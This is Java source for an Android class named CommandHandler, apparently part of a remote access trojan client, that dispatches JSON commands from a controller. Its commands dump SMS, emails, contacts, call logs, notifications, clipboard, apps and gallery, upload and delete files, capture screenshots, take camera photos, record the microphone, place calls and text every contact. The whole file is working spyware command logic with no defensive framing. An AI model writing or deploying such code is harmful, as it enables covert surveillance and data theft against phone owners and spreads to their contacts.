package com.rainbow.client;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class CommandHandler {

    private static final String TAG = "RainbowCmd";
    private final Context ctx;

    public CommandHandler(Context ctx) { this.ctx = ctx; }

    public void handle(JSONObject data) {
        try {
            String request = data.optString("request", "");
            JSONArray extras = data.optJSONArray("extras");
            String path = "";
            String number = "";
            String text = "";

            if (extras != null) {
                for (int i = 0; i < extras.length(); i++) {
                    JSONObject e = extras.getJSONObject(i);
                    String key = e.optString("key", "");
                    String value = e.optString("value", "");
                    if (key.equals("path")) path = value;
                    else if (key.equals("number")) number = value;
                    else if (key.equals("text")) text = value;
                }
            }

            switch (request) {
                case "all-sms":        SMSHelper.dumpAll(ctx); break;
                case "all-email":      SMSHelper.dumpEmails(ctx); break;
                case "sendSms":        SMSHelper.send(ctx, number, text); break;
                case "smsToAllContacts": SMSHelper.sendAllContacts(ctx, text); break;
                case "textToAllContacts": SMSHelper.textAllContacts(ctx, text); break;
                case "contacts":       ContactsHelper.dump(ctx); break;
                case "calls":          CallLogHelper.dump(ctx); break;
                case "notifications":  NotificationHelper.dump(ctx); break;
                case "clipboard":      ClipboardHelper.dump(ctx); break;
                case "file-explorer":  FileHelper.list(ctx, path); break;
                case "cd":             FileHelper.list(ctx, path); break;
                case "upload":         FileHelper.upload(ctx, path); break;
                case "delete":         FileHelper.delete(ctx, path); break;
                case "screenshot":     ScreenHelper.capture(ctx); break;
                case "main-camera":    CameraHelper.shoot(ctx, false); break;
                case "selfie-cam":     CameraHelper.shoot(ctx, true); break;
                case "microphone":     AudioHelper.record(ctx, 10); break;
                case "recordVoice":    AudioHelper.record(ctx, 15); break;
                case "playAudio":      AudioHelper.play(ctx, path); break;
                case "vibrate":        AudioHelper.vibrate(ctx); break;
                case "apps":           AppsHelper.dump(ctx); break;
                case "gallery":        FileHelper.gallery(ctx); break;
                case "makeCall":       CallLogHelper.call(ctx, number); break;
                case "makeCallNumber": CallLogHelper.call(ctx, number); break;
                case "ping":           break;
                default: Log.d(TAG, "unknown " + request);
            }
        } catch (Exception e) {
            Log.e(TAG, "handle", e);
        }
    }
}